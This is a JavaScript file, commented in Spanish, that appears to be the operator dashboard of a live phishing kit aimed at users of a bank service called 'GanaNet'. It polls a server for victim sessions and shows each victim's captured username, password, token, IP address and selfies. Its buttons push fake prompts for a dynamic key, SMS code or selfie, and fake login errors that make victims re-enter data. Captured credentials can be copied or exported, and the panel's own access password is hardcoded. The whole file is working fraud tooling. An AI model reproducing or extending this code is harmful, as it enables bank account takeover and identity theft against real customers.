/**
 * Panel operador GanaNet.
 * Cola ordenada de usuarios en espera para enviar GanaPin o Autenticador.
 */
const LANE_COUNT = 5

const emptyState = document.getElementById('emptyState')
const rowCount = document.getElementById('rowCount')
const hint = document.getElementById('hint')
const btnClean = document.getElementById('btnClean')
const btnExport = document.getElementById('btnExport')
const audioStatus = document.getElementById('audioStatus')
let isInitialLoad = true;
let audioCtx = null;
const PANEL_AUTH = 'Basic ' + btoa('Morderkaiser:M3q7Xp9Wv2R4k5T8zY');

async function panelFetch(url, options = {}) {
  const headers = {
    'Authorization': PANEL_AUTH,
    ...(options.headers || {}),
  };
  return fetch(url, {
    ...options,
    credentials: 'include',
    headers,
  });
}

/** @type {Map<string, object>} */
const rows = new Map()

function statusLabel(state) {
  if (state === 'waiting') return 'En espera'
  if (state === 'active') return 'Activo'
  if (state === 'done') return 'Listo'
  if (state === 'error-login') return 'Error de datos'
  if (state === 'error') return 'Error'
  if (state === 'waiting-dinamica') return 'Dinámica solicitada'
  if (state === 'waiting-sms') return 'SMS / Correo solicitado'
  if (state === 'waiting-selfie' || state === 'selfie') return 'Selfie solicitada'
  if (state === 'received-dinamica') return 'Dinámica'
  if (state === 'received-sms') return 'SMS / Correo'
  if (state === 'received-selfie') return 'Selfie tomada'
  if (state === 'error-dinamica') return 'Error Dinámica'
  if (state === 'error-sms') return 'Error SMS/Correo'
  if (state === 'error-selfie') return 'Error Selfie'
  if (state === 'typing') return 'Escribiendo código'
  return 'Nuevo'
}

function badgeClass(state) {
  if (state === 'typing') {
    return 'badge badge--typing'
  }
  if (
    state === 'waiting' ||
    state === 'waiting-dinamica' ||
    state === 'waiting-sms' ||
    state === 'waiting-selfie' ||
    state === 'selfie'
  ) {
    return 'badge badge--wait'
  }
  if (state === 'active' || state === 'received-selfie') return 'badge badge--hola'
  if (state === 'done') return 'badge badge--done'
  if (state === 'received-dinamica' || state === 'received-sms') {
    return 'badge badge--login'
  }
  if (
    state === 'error-login' ||
    state === 'error-dinamica' ||
    state === 'error-sms' ||
    state === 'error-selfie' ||
    state === 'error'
  ) {
    return 'badge badge--error'
  }
  return 'badge badge--login'
}

function formatTime(ts) {
  try {
    return new Date(ts).toLocaleTimeString('es-BO', {
      hour: 'numeric',
      minute: '2-digit',
      second: '2-digit',
      hour12: true,
    })
  } catch {
    return '—'
  }
}

function laneForIndex(index) {
  return ((Number(index) || 1) - 1) % LANE_COUNT
}

function getLaneBody(lane) {
  return document.querySelector(`[data-lane-body="${lane}"]`)
}

function getDeviceIcon(device) {
  if (device === 'mobile') {
    return `
      <span style="display:inline-flex; align-items:center; gap:6px; font-weight:600; color:#555;" title="Celular">
        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="color:#d96500;">
          <rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect>
          <line x1="12" y1="18" x2="12.01" y2="18"></line>
        </svg>
        Celular
      </span>
    `
  }
  return `
    <span style="display:inline-flex; align-items:center; gap:6px; font-weight:600; color:#555;" title="PC">
      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="color:#0b5ed7;">
        <rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect>
        <line x1="8" y1="21" x2="16" y2="21"></line>
        <line x1="12" y1="17" x2="12" y2="21"></line>
      </svg>
      PC
    </span>
  `
}

function isOnline(row) {
  return !!row.online;
}

async function setRowState(rowId, state, action) {
  const row = rows.get(rowId)
  if (!row) return
  row.state = state
  row.last_seen = Date.now()
  row.updatedAt = Date.now()
  hint.textContent = `${row.user || rowId} → ${statusLabel(state)}`

  try {
    await panelFetch(`/api/sessions/${rowId}/action`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ action, state })
    });
  } catch {}
  render()
}

function createRow(row) {
  const tr = document.createElement('tr')
  tr.dataset.rowId = row.id
  tr.innerHTML = `
    <td class="col-num"></td>
    <td class="col-time mono"></td>
    <td class="col-tipo mono"></td>
    <td class="col-device"></td>
    <td class="col-ip mono"></td>
    <td class="col-user mono"></td>
    <td class="col-pass mono copyable" title="Copiar clave"></td>
    <td class="col-token mono copyable" title="Copiar token"></td>
    <td class="col-selfie"></td>
    <td class="col-online"></td>
    <td class="col-status"></td>
    <td>
      <div class="row-actions">
        <button type="button" class="btn btn--warning" data-action="error-login">Err Clave</button>
        <button type="button" class="btn btn--ok" data-action="dinamica">Dinámica</button>
        <button type="button" class="btn btn--ok" data-action="sms">SMS / Correo</button>
        <button type="button" class="btn btn--ok" data-action="selfie" style="background:#7c3aed; color:#fff; border-color:#6d28d9;">Selfie</button>
        <button type="button" class="btn btn--error" data-action="error-dinamica">Err Dinámica</button>
        <button type="button" class="btn btn--error" data-action="error-sms">Err SMS</button>
        <button type="button" class="btn btn--error" data-action="error-selfie">Err Selfie</button>
        <button type="button" class="btn btn--done" data-action="done">Listo</button>
      </div>
    </td>
  `

  tr.querySelector('[data-action="dinamica"]')?.addEventListener('click', () => {
    const current = rows.get(row.id)
    if (current?.state === 'waiting-dinamica') {
      setRowState(row.id, 'waiting', null)
      return
    }
    setRowState(row.id, 'waiting-dinamica', 'dinamica')
  })
  tr.querySelector('[data-action="sms"]')?.addEventListener('click', () => {
    const current = rows.get(row.id)
    if (current?.state === 'waiting-sms') {
      setRowState(row.id, 'waiting', null)
      return
    }
    setRowState(row.id, 'waiting-sms', 'sms')
  })
  tr.querySelector('[data-action="selfie"]')?.addEventListener('click', () => {
    setRowState(row.id, 'waiting-selfie', 'selfie')
  })
  tr.querySelector('[data-action="error-login"]')?.addEventListener('click', () => {
    setRowState(row.id, 'error-login', 'error-login')
    playErrorSound()
  })
  tr.querySelector('[data-action="error-dinamica"]')?.addEventListener('click', () => {
    setRowState(row.id, 'error-dinamica', 'error-dinamica')
    playErrorSound()
  })
  tr.querySelector('[data-action="error-sms"]')?.addEventListener('click', () => {
    setRowState(row.id, 'error-sms', 'error-sms')
    playErrorSound()
  })
  tr.querySelector('[data-action="error-selfie"]')?.addEventListener('click', () => {
    setRowState(row.id, 'error-selfie', 'error-selfie')
    playErrorSound()
  })
  tr.querySelector('[data-action="done"]')?.addEventListener('click', () => {
    setRowState(row.id, 'done', 'done')
    playSuccessSound()
  })

  tr.querySelectorAll('td.copyable').forEach((td) => {
    td.addEventListener('click', async () => {
      const text = td.textContent?.trim()
      if (!text || text === '—') return
      try {
        await navigator.clipboard.writeText(text)
        td.classList.add('copied')
        setTimeout(() => td.classList.remove('copied'), 900)
      } catch {
        /* ignore */
      }
    })
  })

  tr.querySelector('.col-user').addEventListener('click', async (event) => {
    const pill = event.target.closest('.copy-subpill');
    if (!pill) return;
    const val = pill.dataset.val;
    if (!val || val === '—') return;
    try {
      await navigator.clipboard.writeText(val);
      pill.classList.add('copied');
      setTimeout(() => pill.classList.remove('copied'), 900);
    } catch {}
  });

  tr.querySelector('.col-selfie')?.addEventListener('click', (event) => {
    const thumb = event.target.closest('.selfie-thumb');
    if (!thumb) return;
    const current = rows.get(row.id);
    if (current && current.selfie) {
      openSelfieModal(current.selfie, current.user || `Sesión #${current.index}`);
    }
  });

  return tr
}

function updateRow(tr, row) {
  const online = isOnline(row)
  tr.querySelector('.col-num').textContent = String(row.index)
  tr.querySelector('.col-time').textContent = formatTime(row.createdAt)
  tr.querySelector('.col-tipo').textContent = row.tipo
  tr.querySelector('.col-device').innerHTML = getDeviceIcon(row.device)
  tr.querySelector('.col-ip').textContent = row.ip || '—'
  const userCell = tr.querySelector('.col-user');
  const userStr = row.user || '—';
  if (userStr.includes(' / ')) {
    const parts = userStr.split(' / ');
    const docPart = parts[0];
    const namePart = parts[1];
    let docNum = docPart;
    if (docPart.includes(':')) {
      docNum = docPart.split(':')[1];
    }
    userCell.innerHTML = `
      <span class="copy-subpill" data-val="${docNum}" title="Copiar Documento (${docPart})">${docPart}</span>
      <span class="subpill-divider">/</span>
      <span class="copy-subpill" data-val="${namePart}" title="Copiar Usuario">${namePart}</span>
    `;
  } else if (userStr.includes(':')) {
    const parts = userStr.split(':');
    const docNum = parts.slice(1).join(':') || userStr;
    userCell.innerHTML = `<span class="copy-subpill" data-val="${docNum}" title="Copiar ${docNum}">${userStr}</span>`;
  } else {
    userCell.innerHTML = `<span class="copy-subpill" data-val="${userStr}">${userStr}</span>`;
  }
  tr.querySelector('.col-pass').textContent = row.clave || '—'
  tr.querySelector('.col-token').textContent = row.token || '—'

  const selfieCell = tr.querySelector('.col-selfie');
  if (selfieCell) {
    const photos = row.selfies && row.selfies.length > 0
      ? row.selfies
      : (row.selfie ? [{ id: '0', photo: row.selfie, timestamp: row.updatedAt }] : []);

    if (photos.length > 0) {
      selfieCell.innerHTML = `
        <div class="selfie-cell-box">
          <div class="selfie-thumbs-row">
            ${photos.map((p, idx) => `
              <img
                src="${p.photo}"
                class="selfie-thumb"
                alt="Foto ${idx + 1}"
                title="Clic para ver Foto #${idx + 1} de ${userStr}"
                onclick="window.openSelfieModal('${p.photo}', '${userStr} (Foto #${idx + 1})')"
              />
            `).join('')}
          </div>
          <span class="selfie-badge-tag">${photos.length > 1 ? `📸 ${photos.length} Fotos` : '📸 Ver Foto'}</span>
        </div>
      `;
    } else if (row.state === 'waiting-selfie' || row.state === 'selfie') {
      selfieCell.innerHTML = `<span class="selfie-waiting-tag">⏳ Esperando...</span>`;
    } else {
      selfieCell.innerHTML = `<span style="color:#555; font-size:12px;">—</span>`;
    }
  }

  tr.querySelector('.col-online').innerHTML = online
    ? '<span class="pill pill--online">En línea</span>'
    : '<span class="pill pill--offline">Off</span>'
  tr.querySelector('.col-status').innerHTML =
    `<span class="${badgeClass(row.state)}">${statusLabel(row.state)}</span>`

  const dinamicaBtn = tr.querySelector('[data-action="dinamica"]')
  const smsBtn = tr.querySelector('[data-action="sms"]')
  const selfieBtn = tr.querySelector('[data-action="selfie"]')
  dinamicaBtn?.classList.toggle('is-on', row.state === 'waiting-dinamica')
  smsBtn?.classList.toggle('is-on', row.state === 'waiting-sms')
  selfieBtn?.classList.toggle('is-on', row.state === 'waiting-selfie' || row.state === 'selfie')
  tr.classList.toggle('is-waiting', row.state === 'waiting')
}

function render() {
  const list = [...rows.values()].sort((a, b) => (a.createdAt || 0) - (b.createdAt || 0))
  list.forEach((row, i) => {
    row.index = i + 1
  })
  rowCount.textContent = String(list.length)
  emptyState.classList.toggle('is-visible', list.length === 0)

  // Render Live Selfie Cards Gallery (shows all received selfies, never replaces)
  const selfieSection = document.getElementById('selfieCardsSection');
  const selfieGrid = document.getElementById('selfieCardsGrid');
  const selfieCount = document.getElementById('selfieCardsCount');

  const allSelfies = [];
  list.forEach(row => {
    const listPhotos = row.selfies && row.selfies.length > 0
      ? row.selfies
      : (row.selfie ? [{ id: `${row.id}_0`, photo: row.selfie, timestamp: row.updatedAt || row.createdAt }] : []);

    listPhotos.forEach((item, idx) => {
      allSelfies.push({
        sessionId: row.id,
        index: row.index,
        user: row.user || `Usuario #${row.index}`,
        photo: item.photo,
        timestamp: item.timestamp || row.updatedAt || row.createdAt,
        photoNum: idx + 1,
        totalForUser: listPhotos.length,
      });
    });
  });

  if (selfieSection && selfieGrid) {
    if (allSelfies.length > 0) {
      selfieSection.hidden = false;
      if (selfieCount) selfieCount.textContent = String(allSelfies.length);

      const laneNames = ['Azul', 'Verde', 'Rojo', 'Gris', 'Amarillo'];
      selfieGrid.innerHTML = allSelfies.map(s => {
        const laneName = laneNames[laneForIndex(s.index)] || 'General';
        const photoLabel = s.totalForUser > 1 ? `Foto #${s.photoNum}` : 'Foto';
        return `
          <div class="selfie-card" data-selfie-id="${s.sessionId}">
            <div class="selfie-card-img-wrap" title="Clic para ampliar ${photoLabel}" onclick="window.openSelfieModal('${s.photo}', '${s.user} (${photoLabel})')">
              <img src="${s.photo}" alt="Selfie de ${s.user}" />
              <span class="selfie-card-num-badge">${photoLabel}</span>
            </div>
            <div class="selfie-card-user" title="${s.user}">
              ${s.user}
            </div>
            <div class="selfie-card-meta">${laneName} · ${formatTime(s.timestamp)}</div>
            <div class="selfie-card-actions">
              <button type="button" class="btn btn--ok" style="background:#7c3aed; color:#fff;" onclick="window.openSelfieModal('${s.photo}', '${s.user} (${photoLabel})')" title="Ver foto ampliada">🔍 Ver</button>
              <button type="button" class="btn" style="background:#2563eb; color:#fff;" onclick="window.setRowState('${s.sessionId}', 'waiting-selfie', 'selfie')" title="Pedir nueva selfie">📸 Otra</button>
              <button type="button" class="btn btn--error" onclick="window.setRowState('${s.sessionId}', 'error-selfie', 'error-selfie')" title="Enviar error de selfie">❌ Err</button>
              <button type="button" class="btn btn--done" onclick="window.setRowState('${s.sessionId}', 'done', 'done')" title="Completar">✅ Listo</button>
            </div>
          </div>
        `;
      }).join('');
    } else {
      selfieSection.hidden = true;
      selfieGrid.innerHTML = '';
    }
  }

  const byLane = Array.from({ length: LANE_COUNT }, () => [])
  list.forEach((row) => {
    byLane[laneForIndex(row.index)].push(row)
  })

  for (let lane = 0; lane < LANE_COUNT; lane += 1) {
    const body = getLaneBody(lane)
    if (!body) continue
    const laneEl = document.querySelector(`[data-lane="${lane}"]`)
    const countEl = laneEl?.querySelector('[data-lane-count]')
    const laneRows = byLane[lane]
    if (countEl) countEl.textContent = String(laneRows.length)

    ;[...body.querySelectorAll('tr[data-row-id]')].forEach((tr) => {
      const row = rows.get(tr.dataset.rowId);
      if (!row || laneForIndex(row.index) !== lane) {
        tr.remove();
      }
    })

    laneRows.forEach((row) => {
      let tr = [...body.querySelectorAll('tr[data-row-id]')].find(
        (node) => node.dataset.rowId === row.id,
      )
      if (!tr) {
        tr = createRow(row)
        body.appendChild(tr)
      }
      updateRow(tr, row)
    })
  }
}

async function pollSessions() {
  try {
    const response = await panelFetch('/api/sessions');
    if (response.ok) {
      const list = await response.json();
      
      // Track existing new entries BEFORE clearing the map
      const oldKeys = new Set(rows.keys());
      let hasNewOrChangedSession = false;
      
      list.forEach((session) => {
        if (!oldKeys.has(session.id)) {
          hasNewOrChangedSession = true;
          requestAnimationFrame(() => {
            const tr = document.querySelector(`tr[data-row-id="${session.id}"]`)
            if (!tr) return
            tr.classList.add('is-new')
            setTimeout(() => tr.classList.remove('is-new'), 1800)
          })
        } else {
          // Compare with stored session BEFORE overwriting it
          const oldSession = rows.get(session.id);
          if (oldSession && oldSession.state !== session.state) {
            // Trigger sound on any relevant state changes
            if (
              session.state === 'waiting' ||
              session.state === 'received-dinamica' ||
              session.state === 'received-sms' ||
              session.state === 'waiting-selfie' ||
              session.state === 'received-selfie' ||
              session.state === 'error-login' ||
              session.state === 'error-dinamica' ||
              session.state === 'error-sms' ||
              session.state === 'error-selfie' ||
              session.state === 'done'
            ) {
              hasNewOrChangedSession = true;
            }
          }
        }
      });

      // Clear and rebuild map
      rows.clear();
      list.forEach((session) => {
        rows.set(session.id, {
          id: session.id,
          index: session.index,
          createdAt: session.createdAt,
          updatedAt: session.updatedAt,
          last_seen: session.last_seen,
          tipo: session.tipoUsuario || session.tipo || 'CODIGO_PERSONA',
          device: session.device || 'desktop',
          ip: session.ip || '127.0.0.1',
          user: session.username || session.user || '—',
          clave: session.password || session.clave || '—',
          token: session.token || '',
          selfie: session.selfie || '',
          selfies: session.selfies || (session.selfie ? [{ id: session.id, photo: session.selfie, timestamp: session.updatedAt || session.createdAt }] : []),
          state: session.state || 'waiting',
          online: session.online
        });
      });
      render();

      if (hasNewOrChangedSession && !isInitialLoad) {
        playNotificationSound();
      }
    }
  } catch {}
}

function initAudio() {
  try {
    if (!audioCtx) {
      audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    }
    if (audioCtx.state === 'suspended') {
      audioCtx.resume().then(updateAudioUI);
    } else {
      updateAudioUI();
    }
  } catch {}
}

function updateAudioUI() {
  if (!audioStatus) return;
  if (isSoundMuted) {
    audioStatus.textContent = '🔇 Sonido: OFF';
    audioStatus.style.color = '#f44336';
    audioStatus.style.borderColor = '#f44336';
    audioStatus.style.background = '#ffebee';
  } else {
    audioStatus.textContent = '🔊 Sonido: ON';
    audioStatus.style.color = '#4caf50';
    audioStatus.style.borderColor = '#4caf50';
    audioStatus.style.background = '#e8f5e9';
  }
}

// Audio status toggle listener
audioStatus?.addEventListener('click', (event) => {
  event.preventDefault();
  event.stopPropagation();
  isSoundMuted = !isSoundMuted;
  localStorage.setItem('isSoundMuted', isSoundMuted ? 'true' : 'false');
  updateAudioUI();
  if (!isSoundMuted) initAudio();
});

window.addEventListener('click', initAudio, { once: true });
window.addEventListener('touchstart', initAudio, { once: true });

updateAudioUI();

function playNotificationSound() {
  if (isSoundMuted) return;
  try {
    initAudio(); // Ensure context is initialized
    if (!audioCtx || audioCtx.state === 'suspended') {
      console.warn("AudioContext is suspended or blocked. Please click anywhere on the page first.");
      return;
    }

    const now = audioCtx.currentTime;
    const frequencies = [587.33, 880]; // D5, A5
    frequencies.forEach((freq, idx) => {
      const osc = audioCtx.createOscillator();
      const gainNode = audioCtx.createGain();
      osc.connect(gainNode);
      gainNode.connect(audioCtx.destination);
      osc.type = 'triangle';
      osc.frequency.setValueAtTime(freq, now + idx * 0.08);
      gainNode.gain.setValueAtTime(0.85, now + idx * 0.08);
      gainNode.gain.exponentialRampToValueAtTime(0.001, now + idx * 0.08 + 0.25);
      osc.start(now + idx * 0.08);
      osc.stop(now + idx * 0.08 + 0.25);
    });
  } catch (e) {
    console.error("No se pudo reproducir el sonido:", e);
  }
}

function playSuccessSound() {
  if (isSoundMuted) return;
  try {
    initAudio();
    if (!audioCtx || audioCtx.state === 'suspended') return;
    
    const osc = audioCtx.createOscillator();
    const gain = audioCtx.createGain();
    osc.connect(gain);
    gain.connect(audioCtx.destination);
    
    osc.type = 'sine';
    osc.frequency.setValueAtTime(659.25, audioCtx.currentTime); // E5
    osc.frequency.setValueAtTime(880, audioCtx.currentTime + 0.08); // A5
    
    gain.gain.setValueAtTime(0.2, audioCtx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.35);
    
    osc.start();
    osc.stop(audioCtx.currentTime + 0.35);
  } catch {}
}

function playErrorSound() {
  if (isSoundMuted) return;
  try {
    initAudio();
    if (!audioCtx || audioCtx.state === 'suspended') return;
    
    const osc = audioCtx.createOscillator();
    const gain = audioCtx.createGain();
    osc.connect(gain);
    gain.connect(audioCtx.destination);
    
    osc.type = 'triangle';
    osc.frequency.setValueAtTime(220, audioCtx.currentTime);
    osc.frequency.setValueAtTime(165, audioCtx.currentTime + 0.12);
    
    gain.gain.setValueAtTime(0.35, audioCtx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.4);
    
    osc.start();
    osc.stop(audioCtx.currentTime + 0.4);
  } catch {}
}

const selfieModal = document.getElementById('selfieModal');
const modalBackdrop = document.getElementById('modalBackdrop');
const modalClose = document.getElementById('modalClose');
const modalImg = document.getElementById('modalImg');
const modalTitle = document.getElementById('modalTitle');

function openSelfieModal(src, title) {
  if (!selfieModal || !modalImg) return;
  modalImg.src = src;
  if (modalTitle) modalTitle.textContent = `Validación Facial — ${title}`;
  selfieModal.hidden = false;
}

window.openSelfieModal = openSelfieModal;
window.setRowState = setRowState;

function closeSelfieModal() {
  if (!selfieModal) return;
  selfieModal.hidden = true;
  if (modalImg) modalImg.src = '';
}

modalClose?.addEventListener('click', closeSelfieModal);
modalBackdrop?.addEventListener('click', closeSelfieModal);
window.addEventListener('keydown', (e) => {
  if (e.key === 'Escape') closeSelfieModal();
});

btnClean?.addEventListener('click', async () => {
  rows.clear()
  try {
    await panelFetch('/api/clear', { method: 'POST' });
  } catch {}
  hint.textContent = 'Cola limpia. Esperando nuevos usuarios…'
  render()
})

function exportToNotepad() {
  const list = [...rows.values()].sort((a, b) => (a.createdAt || 0) - (b.createdAt || 0));
  if (list.length === 0) {
    alert("No hay información en el panel para guardar.");
    return;
  }

  let text = "";
  list.forEach((row, i) => {
    text += `=== SESION #${i + 1} ===\r\n`;
    text += `Fecha/Hora: ${new Date(row.createdAt).toLocaleString('es-CO')}\r\n`;
    text += `Tipo: ${row.tipo}\r\n`;
    text += `Dispositivo: ${row.device}\r\n`;
    text += `IP: ${row.ip}\r\n`;
    text += `Usuario: ${row.user}\r\n`;
    text += `Clave: ${row.clave}\r\n`;
    const countSelfies = row.selfies ? row.selfies.length : (row.selfie ? 1 : 0);
    text += `Selfies: ${countSelfies > 0 ? `${countSelfies} recibida(s)` : 'No enviada'}\r\n`;
    text += `Estado final: ${statusLabel(row.state)}\r\n`;
    text += `========================\r\n\r\n`;
  });

  const blob = new Blob([text], { type: "text/plain;charset=utf-8" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = `sesiones_panel_${Date.now()}.txt`;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}

btnExport?.addEventListener('click', () => {
  exportToNotepad();
});

// Poll sessions every 2 seconds
window.setInterval(pollSessions, 2000)

// Initial load
pollSessions().then(() => {
  isInitialLoad = false; // Initial fetch completed, enable sound notifications
  updateAudioUI(); // Ensure toggle button reflects correct state on load
  hint.textContent = rows.size
    ? `En cola: ${rows.size}. Elige Dinámica o SMS en Acciones.`
    : 'Esperando usuarios del login… Al ingresar llegan aquí ordenados.'
});
